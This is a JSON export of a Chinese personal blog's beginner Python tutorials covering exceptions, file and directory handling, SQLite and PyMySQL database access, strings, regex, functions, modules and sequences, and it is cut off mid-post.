{"meta":{"title":"qwzf","subtitle":null,"description":null,"author":"qwzf","url":"https://qwzf.gitee.io/blog","root":"/blog/"},"pages":[{"title":"about","date":"2019-03-19T03:09:24.000Z","updated":"2019-03-19T03:10:43.303Z","comments":true,"path":"about/index.html","permalink":"https://qwzf.gitee.io/blog/about/index.html","excerpt":"","text":"一个爱学习的小白"}],"posts":[{"title":"Python学习-基础篇(四)","slug":"Python学习-基础篇(四)","date":"2020-01-21T13:31:15.221Z","updated":"2020-01-21T13:55:37.968Z","comments":true,"path":"2020/01/21/Python学习-基础篇(四)/","link":"","permalink":"https://qwzf.gitee.io/blog/2020/01/21/Python学习-基础篇(四)/","excerpt":"","text":"前言本篇包含：异常处理及程序调试、文件及目录操作、操作数据库 八、异常处理及程序调试Python 常见异常类型 1、异常处理语句1.try…except语句try: 语句块1except [ExceptionName [as alias]]: 语句块2#ExceptionName指定要捕获的异常；不指定，处理所有异常#出现异常，执行语块2#处理多个异常：except (异常1,异常2) as alias: def chufa(): #除法 a = int(input(\"请输入被除数:\")) b = int(input(\"请输入除数:\")) print(a,\"除以\",b,\"的结果为:\",a/b)if __name__ == '__main__': try: chufa() except ZeroDivisionError: print(\"\\n被除数不能为0！！！\") 2.try…except…else语句try: 语句块1except [ExceptionName [as alias]]: 语句块2else: 语句块3#没有出现异常，执行语块3；出现异常不执行语块3 3.try…except…finally语句try: 语句块1except [ExceptionName [as alias]]: 语句块2finally: 语句块3#无论是否出现异常，都执行语块3 4.使用raise语句抛出异常某个方法或函数可能会产生异常，不想在当前的方法或函数处理异常，可以使用raise语句在方法或函数中抛出异常。raise [ExceptionName[(reason)]]#reason异常信息描述#省略[ExceptionName[(reason)]]会把异常原样抛出#省略[(reason)]，异常不带描述信息 def chufa(): #除法 a = int(input(\"请输入被除数:\")) b = int(input(\"请输入除数:\")) if a &lt; b: raise ValueError(\"这里被除数要大于除数！\") print(a,\"除以\",b,\"的结果为:\",a/b)if __name__ == '__main__': chufa() 2、程序调试1.使用自带的IDLE进行程序调试IDLE-&gt;Debug-&gt;Debugger添加断点：在要添加断点的行-&gt;右键-&gt;Set Breakpoint使用 python IDLE 自带的 debuger 进行调试2.使用assert语句调试程序assert expression [,reason]#expression 表达式为真时，什么都不做，表达式为假时，抛出AssertionError异常；#reason可选参数，用于对判断条件进行描述，为了以后更好的知道哪里出现了问题。 assert语句只在调试阶段有效.所以我们平时测试用的debug版本才会有断言挂起,release版本没有断言apple=int(input(\"请输入苹果数量：\"))children=int(input(\"请输入小朋友的数量：\"))assert apple&gt;children,\"苹果不够分\"#结果请输入苹果数量：10请输入小朋友的数量：20Traceback (most recent call last): File \"C:\\Python27\\main.py\", line 9, in &lt;module&gt; assert apple&gt;children,\"苹果不够分\"AssertionError: 苹果不够分 注：（1）断言只能作为辅助调试手段使用，在表达式为False时抛出异常终止程序执行，不能在程序中代替条件判断语句，因为程序以优化方式运行时不会执行断言语句。（2）添加-O参数程序运行在优化模式，不会输出断言：python -O 文件名.py 九、文件及目录操作1、基本文件操作打开文件-&gt;写入内容-&gt;关闭文件打开文件-&gt;读取内容-&gt;(关闭文件,也可以不关闭)1.创建和打开文件file = open(filename[,mode[,buffering]])#mode文件打开模式：r只读、w只写、a追加#buffering指定读写的缓存模式：0不缓存、1缓存、大于1缓冲区大小 file = open('qwzf.txt','w') #创建文件file = open('qwzf.txt','r') #打开gbk文件file = open('qwzf.txt','r',encoding = \"utf-8\") #打开utf-8文件file = open('qwzf.jpg','rb')#以二进制形式打开文件 2.关闭文件file.close() 判断文件是否关闭：print(file.closed)3.打开文件时使用with语句使用with语句打开文件，可以自动关闭文件with expression as target: with-body#expression可以指定要打开文件的open函数#as target指定变量，target保存表达式的结果#with-body语句体 with open('qwzf.txt','r',encoding = \"utf-8\") as file: #打开文件 pass 4.写入文件内容file.write(string) file = open('qwzf.txt','w',encoding = \"utf-8\") #打开文件file.write(\"我学Python\") #写入内容file.close() #关闭文件 如果不想关闭并把内容写入文件，可以使用file.flush() 把缓冲区内容写入文件将列表内容写入文件list1 = [\"qwzf\",\"lemon\",\"chumen007\"]with open(\"qwzf.txt\",\"w\") as file: file.writelines([line + \"\\n\" for line in list1]) 5.读取文件文件打开模式只能是r(只读)或r+(读写)（1）读取指定字符：file.read([size])file.seek()将文件指针移到要截取的位置with open(\"qwzf.txt\",\"r\") as file: #打开文件 print(\"文件内容:\",file.read()) file.seek(10) #定位到第10个字节 string = file.read(2) #读取两个字符 print(string) （2）读取一行：file.readline()with open(\"qwzf.txt\",\"r\") as file: #打开文件 num = 0 #记录行号 while True: num += 1 line = file.readline() #读取一行 if line == \"\": break print(num,line,end=\"\\n\") #输出一行 （3）读取全部行：file.readlines()，返回字符串列表 2、目录操作1.os和os.path模块os模块是Python内置的与操作系统功能和文件系统相关的模块。该模块的语句的执行结果通常与操作系统有关。os.path模块是os模块的子模块python之OS模块详解python之os模块Python必学的OS模块详解2.路径os.getcwd()获取文件当前工作目录os.path.abspath(path)获取文件绝对路径os.path.join(path1[,path2[,...]])拼接路径path：路径import osprint(\"当前工作目录:\",os.getcwd())with open(\"test/qwzf.txt\",\"r\") as file: #通过相对路径打开文件 print(file.read())print(\"文件绝对路径:\",os.path.abspath(\"test/qwzf.txt\"))print(\"拼接路径:\",os.path.join(r\"F:\\Python\",r\"test\\qwzf.txt\"))#拼接路径不会检查目录是否存在 3.判断目录是否存在os.path.exists(path)判断目录(文件)是否存在，不区分大小写4.创建目录os.mkdir(path,mode=0o777) mode指定数值模式，可省略import osif not os.path.exists(r\"D:\\demo\"): os.mkdir(r\"D:\\demo\")else: print(\"该目录已存在\") 创建多级目录（1）递归调用os.mkdir()import osdef mkdir(path): #创建一个递归函数用于创建目录 if not os.path.isdir(path): #判断是否为路径 mkdir(os.path.split(path)[0]) else: return os.mkdir(path) #创建目录mkdir(r\"D:\\demo\\qwzf1\\qwzf2\") （2）os.makedirs(name,mode=0o777)创建多级目录import osos.makedirs(r\"D:\\demo\\qwzf\\qwzf2020\") #创建多级目录 5.删除目录删除空目录：os.rmdir(path)删除非空目录：shutil.rmtree(path)import shutilshutil.rmtree(r\"D:\\demo\") #删除非空目录 6.遍历目录os.walk(top[,topdown][,onerror][,followlinks])#top 指定要遍历内容的根目录#topdown 可选,为 True,则优先遍历top目录,否则优先遍历 top 的子目录(默认为开启)。#onerror 可选，指定错误处理方式#followlinks 可选,如果为 True，访问软链接指向的目录，默认开启'''返回值：元组生成器对象(dirpath,dirnames,filenames)dirpath 字符串 当前正在遍历的路径dirnames 列表 当前路径下包含的子目录filenames 列表 当前路径下包含的文件''' import ospath = r\"F:\\Python\\test\"print(\"未整理前的遍历结果:\")for p in os.walk(path): print(p,\"\\n\")print(\"整理后的遍历结果:\")print(\"【\",path,\"】目录下包含的文件和目录:\")for root,dirs,files in os.walk(path): #遍历指定目录 for dirname in dirs: print(os.path.join(root,dirname)) #输出遍历到的目录 for filename in files: print(\"\\t\",os.path.join(root,filename)) #输出遍历到的目录 3、高级文件操作1.删除文件os.remove(path)2.重命名文件和目录os.rename(src,dst)#src要进行重命名的目录或文件路径#dst重命名之后的目录或文件路径 3.获取文件基本信息os.stat(path)os.stat() 方法python获取文件信息import osdef formatTime(longtime): '''格式化时间的函数''' import time return time.strftime(\"%Y-%m-%d %H:%M:%S\",time.localtime(longtime))def formatByte(number): '''格式化文件大小的函数''' for(scale,label) in [(1024*1024*1024,\"GB\"),(1024*1024,\"MB\"),(1024,\"KB\")]: if number&gt;=scale: return \"%.2f %s\" %(number*1.0/scale,lable) elif number ==1: return \"1字节\" else: #小于1字节 byte = \"%.2f\" % (number or 0) return (byte[:-3] if byte.endswith(\".00\") else byte) + \"字节\"fileinfo = os.stat(\"qwzf.png\") #获取文件的基本信息print(\"文件完整路径：\",os.path.abspath(\"qwzf.png\")) #获取文件的完整路径#输出文件的基本信息print(\"索引号:\",fileinfo.st_ino)print(\"设备名:\",fileinfo.st_dev)print(\"文件大小:\",formatByte(fileinfo.st_size))print(\"最后一次访问时间:\",formatTime(fileinfo.st_atime))print(\"最后一次修改时间:\",formatTime(fileinfo.st_mtime))print(\"最后一次状态变化的时间:\",formatTime(fileinfo.st_ctime)) 十、操作数据库1、数据库编程接口Python操作数据库的规范：DB_API参考：数据库__DB-API、Python DB-API1.连接对象connect()函数-&gt;Connection对象Connection()的常用参数列表： dsn:数据源名称.给出该参数表示数据库依赖 user: 数据库登陆名.默认是当前用户 password: 数据库登陆的秘密.默认为空 host: 数据库主机名.默认是用本地主机 database(db): 要使用的数据库名.没有默认值 port: MySQL服务使用的TCP端口.默认是3306 charset: 数据库编码. utf-8 Connection对象常用方法： cursor() :使用该连接创建并返回游标(获取游标对象，操作数据库。)commit():提交当前事务rollback():回滚当前事务close():关闭数据库连接 2.游标对象Connection对象-&gt;cursor()-&gt;Cursor对象Cursor对象常用方法： callproc(procname,[,parameters]):调用存储过程，需要数据库支持close():关闭当前游标对象excute(sql[, args]):执行一个数据库查询或命令excutemany(sql, args):执行多个数据库查询或命令fetchone():获取查询结果集的下一条记录fetchmany([size = cursor.arraysize]):获取指定数量的记录fetchall():获取结果集的所有记录nextset():跳至下一个可用结果集 #获取Connection对象conn = pymysql.connect(host='localhost', user='user', password='passwd', db='test', charset='utf-8' cursorclass=pymysql.cursors.DictCursor)#生成Cursor对象cur = conn.cursor()#执行SQL语句cur.excute(\"insert into users(id,name) values(1,'qwzf')\")#关闭Cursor对象cur.close()#提交当前事务conn.commit()#关闭Connection对象conn.close() 2、使用SQLitePython内置SQLite模块：sqlite3连接数据库-&gt;执行SQL语句-&gt;关闭连接1.创建数据库文件实现步骤：导入sqlite3模块-&gt;创建Connection对象-&gt;创建Cursor对象-&gt;执行SQL语句-&gt;关闭游标-&gt;关闭连接#导入模块import sqlite3#创建连接对象conn = sqlite3.connect('qwzf.db')#创建游标对象cursor = conn.cursor()#执行SQL语句cursor.execute('create table user(id int(10) primary key,name varchar(20))')#关闭游标cursor.close()#关闭连接conn.close() 2.操作SQLite数据库即增删改查，参考：python 操作SQLite3数据库的方法 3、使用PyMySQL PyMySQL 是在 Python3.x 版本中用于连接 MySQL 服务器的一个库1.下载安装MySQL可以直接使用内置MySQL的集成软件，如：phpstudy2.安装PyMySQLpip install PyMySQL 测试是否安装成功&gt;&gt;&gt; import pymysql 3.连接数据库#导入PyMySQL模块import pymysql#调用connect()函数产生Connection连接对象db = pymysql.connect('localhost','root','root','testpy','utf8')#db = pymysql.connect(host = 'localhost',user = 'root',password = 'root',database = 'testpy',charset = 'utf8')#调用cursor()方法，创建Cursor对象cursor = db.cursor()#执行SQL语句cursor.execute('select version()')data = cursor.fetchone()print(data)#关闭游标和连接cursor.close()db.close() 4.操作MySQL数据库即增删改查，参考：使用pymysql操作数据库、pymysql数据库之建库建表、增删改查 后记到现在为止Python基础知识已经基本学完了(这里表示还没学Python的面向对象程序设计和GUI界面编程)。在这些Python的基础知识上，可以开始愉快的开启Python进阶之旅了@_@！！！","categories":[{"name":"Python","slug":"Python","permalink":"https://qwzf.gitee.io/blog/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://qwzf.gitee.io/blog/tags/Python/"},{"name":"异常处理及程序调试","slug":"异常处理及程序调试","permalink":"https://qwzf.gitee.io/blog/tags/异常处理及程序调试/"},{"name":"文件及目录操作","slug":"文件及目录操作","permalink":"https://qwzf.gitee.io/blog/tags/文件及目录操作/"},{"name":"操作数据库","slug":"操作数据库","permalink":"https://qwzf.gitee.io/blog/tags/操作数据库/"}],"author":"qwzf"},{"title":"Python学习-基础篇(三)","slug":"Python学习-基础篇(三)","date":"2020-01-19T10:16:50.249Z","updated":"2020-01-19T12:07:46.403Z","comments":true,"path":"2020/01/19/Python学习-基础篇(三)/","link":"","permalink":"https://qwzf.gitee.io/blog/2020/01/19/Python学习-基础篇(三)/","excerpt":"","text":"前言由于我现在暂时用不到面向对象程序设计，所以暂且先不学习Python的面向对象程序设计。本篇包含：字符串及正则表达式、函数、模块 五、字符串及正则表达式1、字符串1.字符串常用操作（1）拼接字符串字符串1+字符串2 = 字符串1 字符串2 字符串不可以直接和数值类型相加（2）计算字符串的长度字符串的长度，即字符串所占字节数。A-Z、a-z、0-9、._空格等占一个字节中文汉字占2~4字节：UTF-8占3个；GBK(gb2312)占2个1）计算字符串字符的个数len(string)#len()函数获取字符的个数，不管中文还是英文都按一个字符计算 2）计算字符串所占字节数len(string.encode()) #计算UTF-8编码字符长度len(string.encode(\"gbk\")) #计算GBK编码字符长度 （3）截取字符串字符串属于序列。所以：1）获取字符可以使用索引string[索引值] 2）截取字符串可以使用切片string[start:end:step] （4）分割、合并字符串1）分割字符串：split()listname = str.split(sep,maxsplit)#sep指定分隔符，默认值是空白符，如：空格、\\n、\\t。#maxsplit分隔次数，-1表示没有限制 &gt;&gt;&gt; str1 = \"你 有 多 自信,\\n世界 就有 多 相信你\"&gt;&gt;&gt; str1.split()['你', '有', '多', '自信,', '世界', '就有', '多', '相信你']&gt;&gt;&gt; str1.split(\" \")['你', '', '有', '多', '自信,\\n世界', '就有', '多', '相信你']&gt;&gt;&gt; str1.split(\" \",5)['你', '', '有', '多', '自信,\\n世界', '就有 多 相信你']&gt;&gt;&gt; str1.split(\"\\n\")['你 有 多 自信,', '世界 就有 多 相信你'] str1 = \"@lemon @qwzf @未完成的歌 @chumen007\"list1 = str1.split(' ') #用空格分隔字符串for item in list1: print(item[1:]) #输出好友，并去掉@ 2）合并字符串：join()strnew = string.join(iterable)#string合并时的分隔符#iterable可迭代对象 list1 = [\"lemon\",\"qwzf\",\"未完成的歌\",\"chumen007\"] #好友列表str1 = \" @\".join(list1) #用空格和@连接str2 = \"@\" + str1print(\"你要@的好友:\",str2) （5）检索字符串检索一个字符串在另一个字符串出现的次数：count()检索是否包含子字符串：find()、index()、in关键字检索是否以指定字符串开头和结尾：startswith()、endswith()str.count(sub[,start[,end]])#sub指定要检索的子字符串#start指定检索的起始位置#end指定检索的结束位置str.find(sub[,start[,end]])#找到返回首次检索到子字符串的索引值；没找到返回-1#find从左往右找，rfind从右往左找str.index(sub[,start[,end]])#找到返回首次检索到子字符串的索引值；没找到返回异常#index从左往右找，rindex从右往左找str.startswith(prefix[,start[,end]])str.endswith(prefix[,start[,end]])#prefix指定要检索的字符串#是，返回True；否，返回False （6）字母的大小写转换1）大写转小写：str.lower()2）小写转大写：str.upper()（7）去除字符串中的空格和特殊字符特殊字符：\\t、\\r、\\n去除字符串左右两端的空格和特殊字符：str.strip([chars])去除字符串左侧和右侧的空格和特殊字符：str.lstrip([chars])、str.rstrip([chars])（8）格式化字符串1）使用%操作符'%[-][+][0][m][.n]格式化字符'%exp#[-]表示左对齐，正数前没有符号；负数的前加上负号#[+]表示右对齐，正数前加上正号；负数的前加上负号#[0]表示右对齐，正数前没有符号；负数的前有负号，填充空白处，一般和[m]一起使用#[m]数值所占宽度#[0][m]不够宽度前补0#[.n]小数点后保留n位数#格式化字符 格式化成字符串s 格式化成十进制整数d 格式化成浮点数f#exp要转换的项 &gt;&gt;&gt; template = '编号:%09d\\t 公司名称:%s\\t 官网:http://www.%s.com' #定义模板&gt;&gt;&gt; item = (6,\"百度\",\"baidu\") #要转换内容&gt;&gt;&gt; print(template%item)编号:000000006 公司名称:百度 官网:http://www.baidu.com 2）使用字符串对象的format()方法(推荐)str.format(args)#str模板#&#123;[index][:[[fill]align][sign][#][width][.precision][type]&#125;#index设置索引位置#fill指定空白处填充字符#align对齐方式:&lt;内容左对齐；&gt;右对齐；=内容左对齐,符号放填充内容的最右侧；^内容居中#sign指定有无符号数##指定2、8、16进制是否加前缀#width指定所占宽度#.precision指定保留小数位数#type要格式化字符的类型：s、d、f#args要转换的项 &gt;&gt;&gt; template = '编号:&#123;:0&gt;9d&#125;\\t 公司名称:&#123;:s&#125;\\t 官网:http://www.&#123;:s&#125;.com' #定义模板&gt;&gt;&gt; print(template.format(7,\"百度\",\"baidu\"))编号:000000007 公司名称:百度 官网:http://www.baidu.com 2.字符串编码转换ASCII、GBK/GB2312、UTF-8str：Unicode字符 如：”拼搏到感动自己”bytes：二进制数据 如：b’\\xd2\\xb0’和b’mr’（1）使用encode()方法编码将字符串转换成二进制数据，即str-&gt;bytesstr.encode([encoding=\"utf-8\"][,errors=\"strict\"])#strict遇到非法参数抛出异常#ignore忽略非法字符#replace用?替换非法字符#xmlcharrefreplace使用xml的字符引用 （2）使用decode()方法解码bytes-&gt;strstr.decode([encoding=\"utf-8\"][,errors=\"strict\"]) str1 = \"拼搏到感动自己\"byte1 = str1.encode(\"GBK\")byte2 = str1.encode(\"utf-8\")str01 = byte1.decode(\"GBK\")str02 = byte2.decode(\"utf-8\")print(\"原字符串：\",str1)print(\"GBK编码：\",byte1)print(\"UTF-8编码：\",byte2)print(\"GBK解码：\",str01)print(\"UTF-8解码：\",str02) 2、正则表达式1.正则表达式（1）行定位符^表示开始$表示结束（2）元字符常用的除^、$外，还有：（3）限定符（4）字符类[]如：匹配元音字母[aeiou]、匹配汉字[\\u4e00-\\u9fa5]（5）排除字符^^放到[]中表示排除，如[^a-zA-Z]（6）选择字符|如：[a-z]|[0-9]匹配a-z或0-9（7）转义字符\\（8）分组()如：(\\.[0-9]{1,3}){3}对分组匹配3次补充：原生字符串，如：&#39;\\\\bm\\\\w*\\\\b&#39;写成原生字符串r&#39;\\bm\\w*\\b&#39; 2.使用re模块实现正则表达式操作（1）匹配字符串1）re.match 只是从头开始匹配re.match(pattern,string,[flags])#pattern模式字符串#string要进行匹配的字符串#flags指定标志位#标志位控制匹配方式：re.I:不区分字母大小写，re.A:让\\w不匹配汉字 import repattern = r'qw_\\w*' #模式字符串string = 'QW_PYTHON qw_python' #要匹配的字符串match = re.match(pattern,string,re.I) #匹配字符串print(match)print(\"起始位置：\",match.start())print(\"结束位置：\",match.end())print(\"匹配数据：\",match.group()) 2）re.search 匹配包含re.search(pattern,string,[flags]) import repattern = r'qw_\\w*' #模式字符串string = '项目QW_PYTHON qw_python' #要匹配的字符串match = re.search(pattern,string,re.I) #匹配字符串print(match)print(\"起始位置：\",match.start())print(\"结束位置：\",match.end())print(\"匹配数据：\",match.group()) 3）re.findall 把所有匹配到的字符放到以列表中的元素返回re.findall(pattern,string,[flags]) import repattern = r'qw_\\w*' #模式字符串string = '项目QW_PYTHON qw_python' #要匹配的字符串match = re.findall(pattern,string,re.I) #匹配字符串print(\"匹配到字符串列表：\",match)print(\"匹配到的字符串：\")for item in match: print(item) （2）替换字符串re.sub 匹配字符并替换re.sub(pattern,repl,string,count,flags)#repl用来进行替换的字符串#count替换的最大次数，默认值0替换所有 import repattern = r'1[3-8]\\d&#123;9&#125;' #模式字符串string = '中奖号码：888999 联系电话：13866666611' #要匹配的字符串result = re.sub(pattern,\"1xxxxxxxxxx\",string) #替换字符串print(result) （3）分割字符串re.split 以匹配到的字符当做列表分隔符re.split(pattern,string,[maxsplit],[flags])#maxsplit最大拆分次数 import repattern = r'[?|&amp;]' #分隔符string = \"http://www.xxx.com/login.php?user='qwzf'&amp;pwd='qwzf'\" #要匹配的字符串result = re.split(pattern,string) #分割字符串print(result) 补充：re.fullmatch 全部匹配 六、函数1、函数的创建和调用#创建函数def functionname([参数]): '''函数说明''' 函数体#调用函数functionname([参数]) 2、参数传递1.了解形式参数和实际参数值传递和引用传递值传递-&gt;不可变对象-&gt;不改变形式参数的值引用传递-&gt;可变对象-&gt;改变形式参数的值2.位置参数位置参数是必须按照定义时的个数和顺序进行参数传递，也称必备参数。3.关键字参数关键字参数是指使用形式参数的名字来确定输入的参数值。def functionname(p1,p2,p3): 函数体functionname(p1=v1,p2=v2,p3=v3)functionname(p1=v1,p3=v3,p2=v2) 4.为参数设置默认值def functionname(...,[参数名=默认值]): 函数体#默认值参数必须放在所有参数的最后如：def functionname(p2,p3,p1=v1): 函数体#查看默认值print(functionname,__defaults__) 为参数设置默认值时，参数必须指向不可变对象。遇到可变对象，参数默认值可以设置为None。5.可变参数个数不固定的参数-&gt;0、1、2…n个参数（1）*parameter接收任意多个实参，并把它们放到元组中也可接收列表def coffee(*name): print(\"\\n咖啡有：\") for item in name: print(item) #输出咖啡名称coffee(\"卡布奇诺\",\"蓝山\",\"拿铁\")list1 = [\"卡布奇诺\",\"蓝山\",\"拿铁\"]coffee(*list1) （2）**parameter接收任意多个类似关键字参数一样显式赋值的实参，并将其放到一个字典中也可接收字典def sign(**sign): print() for key,value in sign.items(): #遍历字典 print(key,\"的汉字是\",value)sign(chi='吃',kan='看')dict1 = &#123;'zi':'字','dian':'典'&#125;sign(**dict1) 3、返回值return [value]#不指定return或没有value，返回None def functionname(p1,p2,p3): 函数体 return r1,r2......result = functionname(v1,v2,v3)#只有一个返回值result保存的是返回值#有多个返回值result保存的是元组 4、变量的作用域变量的作用域是指程序代码能够访问该变量的区域，如果超出该区域，再访问时就会出现错误。根据变量有效范围：局部变量和全局变量函数体内修改全局变量：在函数体内定义一个全局变量，使用global关键字将局部变量变成全局变量string = \"我学Python\"def demo(): global string #定义全局变量 string = \"我被修改了！\" #修改全局变量 print(\"函数内全局变量\",string)demo()print(\"函数外全局变量\",string) 5、匿名函数(lambda)Python中使用lambda表达式来实现匿名函数。result = lambda [arg1[,arg2,...,argn]]:expression#arg1参数#expression实现具体功能的表达式，不能出现for或while等 import mathr = 10 #半径result = lambda r:math.pi*r*rprint(\"半径为\",r,\"的圆面积为:\",result(r)) 七、模块1、模块概述模块是Python程序模块-&gt;*.py把能够实现某一特定功能的代码放置在一个文件中作为一个模块，从而方便其他程序和脚本导入并使用。使用模块的四点好处：（1）可以避免函数名和变量名冲突（2）更容易查找代码（3）提高代码的可重用性（4）有选择的使用 2、自定义模块模块可包含：函数、变量、类、可执行代码1.创建模块模块名.py-&gt;文件名模块名不能是Python自带的标准模块名称。#calculate.pydef add(a,b): #加法 return round(a+b,1) #demo.pyimport calculate #导入模块x = 0.2y = 0.3print(calculate.add(x,y)) 2.使用import语句导入模块import modulename [as alias]#alias别名#使用as关键字为模块指定别名#指定别名之后，可以通过别名引用模块 import语句导入模块-&gt;命名空间3.使用from…import语句导入模块from modulename import member#member变量、函数、类#导入模块全部定义，使用*#dir()函数打印模块的全部定义 #calculate.pydef add(a,b): #加法 return round(a+b,1)def sub(a,b): #减法 return round(a-b,1)def mul(a,b): #乘法 return round(a*b,1) #demo.pyfrom calculate import add #导入模块中add()函数x = 0.2y = 0.3print(add(x,y)) 注：导入两个包括同名函数的模块，使用import语句导入。4.模块搜索目录导入模块时查找模块的顺序是：1）先从内存中，已经存在的模块中查找2）内置的模块3）自定义模块4）环境变量sys.path中找（1）临时添加临时目录只在当前执行的窗口有效#F:\\Python\\temp\\calculate.pydef add(a,b): #加法 return round(a+b,1) #F:\\Python\\demo\\demo.pyimport sys #导入内置模块sys.path.append('F:/Python/temp') #添加临时目录import calculate #导入自定义模块print(sys.path)x = 0.2y = 0.3print(calculate.add(x,y)) （2）增加.pth文件(推荐)只在当前Python版本有效#F:\\Python\\demo\\demo.pyimport sys #导入内置模块import calculate #导入自定义模块print(sys.path)x = 0.2y = 0.3print(calculate.add(x,y)) （3）在PYTHONPATH环境变量中添加在多个Python版本有效 3、以主程序的形式执行由于Python没有统一的程序入口，从第一行开始执行。会出现一些问题。解决方法：以主程序的形式执行if __name__ == '__main__'#__name__记录模块名称的变量。#当程序在顶级模块运行时，返回的值就是__main__；被导入其他文件时，返回的值是模块名称 #calculate.pystr1 = \"我学Python\"def string(): str2 = \"没有什么不可能\" return str2print(\"__name__运行测试：\",__name__)if __name__ == '__main__': print(\"以主程序的形式执行\") print(str1) #main.pyimport calculate #导入模块print(\"导入模块后输出:\",calculate.str1) 4、Python中的包包-&gt;文件夹-&gt;__init__.py规范代码模块：避免函数名和变量名重名引发的冲突包：避免模块名重名引发的冲突1.Python程序的包结构文件夹下包含__init__.py，则这个文件夹就是个包2.创建和使用包（1）创建包1）创建文件夹2）在文件夹下，创建__init__.py3）在文件夹下，创建模块（2）使用包1）import + 完整包名 + 模块名如：import settings.sizeprint(settings.size.width) 2）from + 完整包名 + import + 模块名如：from settings import sizeprint(size.width) 3）from + 完整包名 + .模块名 + import + 定义名如：from settings.size import widthprint(width) 5、引用其他模块1.标准模块标准模块可查看官方说明文档：python37/Doc/python373.chm：The Python Standard Library中文版参考：Python3.x标准模块库目录2.第三方模块的下载与安装（1）下载网站：https://pypi.org/http://pypi.python.org/pypi （2）pippip &lt;command&gt; [modulename]#command包括：install、uninstall、list#install安装第三方模块#uninstall卸载第三方模块#list显示已经安装的第三方模块 导入模块顺序：标准模块-&gt;第三方模块-&gt;自定义模块常用pip命令：1）不同Python版本使用pip：python3 -m pip &lt;command&gt; [modulename] 2）pip源临时更换到国内镜像：pip install -i https://pypi.tuna.tsinghua.edu.cn/simple [modulename] 将pip源更换到国内镜像（3）通过setup.py安装打开cmd 到达安装目录python setup.py buildpython setup.py install 后记学习完字符串及正则表达式、函数、模块后，掌握了字符串的操作、正则表达式模式串的编写、函数相关知识和模块的使用。继续学习@_@","categories":[{"name":"Python","slug":"Python","permalink":"https://qwzf.gitee.io/blog/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://qwzf.gitee.io/blog/tags/Python/"},{"name":"字符串及正则表达式","slug":"字符串及正则表达式","permalink":"https://qwzf.gitee.io/blog/tags/字符串及正则表达式/"},{"name":"函数","slug":"函数","permalink":"https://qwzf.gitee.io/blog/tags/函数/"},{"name":"模块","slug":"模块","permalink":"https://qwzf.gitee.io/blog/tags/模块/"}],"author":"qwzf"},{"title":"Python学习-基础篇(二)","slug":"Python学习-基础篇(二)","date":"2020-01-18T12:01:31.049Z","updated":"2020-01-18T12:22:25.574Z","comments":true,"path":"2020/01/18/Python学习-基础篇(二)/","link":"","permalink":"https://qwzf.gitee.io/blog/2020/01/18/Python学习-基础篇(二)/","excerpt":"","text":"前言本篇包含：序列的应用(列表、元组、字典、集合) 四、序列的应用序列序列是一块用于存放多个值的连续内存空间，并且按一定顺序排列，可以通过索引取值。1.索引索引-&gt;编号-&gt;下标从0开始计数索引可以是负数(从-1开始)元素1 元素2 元素3 元素40 1 2 3-4 -3 -2 -1 &gt;&gt;&gt; string = \"一言既出，驷马难追。\"&gt;&gt;&gt; print(string[1])言&gt;&gt;&gt; print(string[-2])追 2.切片(分片)sname[start : end : step]#sname：列表名称#start：起始值(包括)#end：结束值(不包括)#step：步长 &gt;&gt;&gt; student = [\"小明\",\"赵四\",\"小赵\",\"李明\",\"张张\",\"李华\",\"王强\"]&gt;&gt;&gt; print(student[1:5])['赵四', '小赵', '李明', '张张']&gt;&gt;&gt; print(student[0:5:2])['小明', '小赵', '张张']&gt;&gt;&gt; print(student[5]) #只有end并省略:就变成了索引李华&gt;&gt;&gt; print(student[:5])['小明', '赵四', '小赵', '李明', '张张']&gt;&gt;&gt; print(student[:])['小明', '赵四', '小赵', '李明', '张张', '李华', '王强']&gt;&gt;&gt; print(student[5:])['李华', '王强'] 3.序列相加序列1+序列2=序列1 序列2只能是同类型的序列相加，如：列表+列表、元组+元组、字符串+字符串&gt;&gt;&gt; stu1 = [\"小明\",\"赵四\",\"小赵\",\"李明\"]&gt;&gt;&gt; stu2 = [\"张张\",\"李华\",\"王强\"]&gt;&gt;&gt; stu = stu1+stu2&gt;&gt;&gt; print(stu)['小明', '赵四', '小赵', '李明', '张张', '李华', '王强'] 4.乘法序列*乘数=重复n次的序列&gt;&gt;&gt; number = [1,2,3]&gt;&gt;&gt; print(number*3)[1, 2, 3, 1, 2, 3, 1, 2, 3]&gt;&gt;&gt; emptylist = [None]*5 #初始化列表长度&gt;&gt;&gt; print(emptylist)[None, None, None, None, None] 5.检查某个元素是否是序列的成员value in sequence#value：要检查的元素#sequence：序列 &gt;&gt;&gt; content = [1,2,3,4,\"小明\",\"李华\"]&gt;&gt;&gt; print(2 in content)True&gt;&gt;&gt; print(\"小明\" in content)True&gt;&gt;&gt; print(6 in content)False&gt;&gt;&gt; print(\"小王\" not in content)True 6.计算序列的长度、最大值和最小值计算序列的长度：len()计算序列的最大值：max()计算序列的最小值：min()将序列转换为列表：list()将序列转换为字符串：str()计算列表之中元素和：sum对元素进行排序：sorted()反转序列元素：reversed()把序列组合为索引序列：enumerate()&gt;&gt;&gt; number = [25,6,32,88,22]&gt;&gt;&gt; print(len(number))5&gt;&gt;&gt; print(max(number))88&gt;&gt;&gt; print(min(number))6&gt;&gt;&gt; string = \"我学Python\"&gt;&gt;&gt; print(len(string))8 1、列表(list)[元素1,元素2,...,元素n] 列表是可变序列，列表可以放入：整数、实数、布尔值、字符串、序列、对象1.列表的创建和删除创建列表（1）使用赋值运算符直接创建列表listname = [元素1,元素2,...,元素n] （2）创建空列表listname = [] （3）创建数值列表listname = [数值1,数值2,...,数值n] #跳一跳&gt;&gt;&gt; list(range(2,21,2))[2, 4, 6, 8, 10, 12, 14, 16, 18, 20] 删除列表del listname Python自带垃圾回收机制会自动销毁不用的列表，所以即使我们不手动将其删除，Python也会自动将其回收。2.访问列表元素访问列表元素，即获取列表的内容。有三种方法：（1）直接使用print()函数输出（2）索引（3）切片3.遍历列表（1）直接使用for循环for item in listname: #输出item （2）使用for循环和enumerate()函数enumerate()函数获取索引值，也就是下标for index,item in enumerate(listname): #输出index和item print(\"成绩排名：\")student = [\"小明\",\"赵四\",\"小赵\",\"李明\",\"张张\",\"李华\",\"王强\"]for index,item in enumerate(student): print(index+1,item) 4.添加、修改和删除列表元素添加元素（1）追加元素：append()、insert()列表1.append(新元素)=列表1中的元素,新元素 列表对象提供了insert()方法向列表的指定位置插入元素列表1.insert(索引值,新元素) insert()方法没有append()方法执行效率高student = 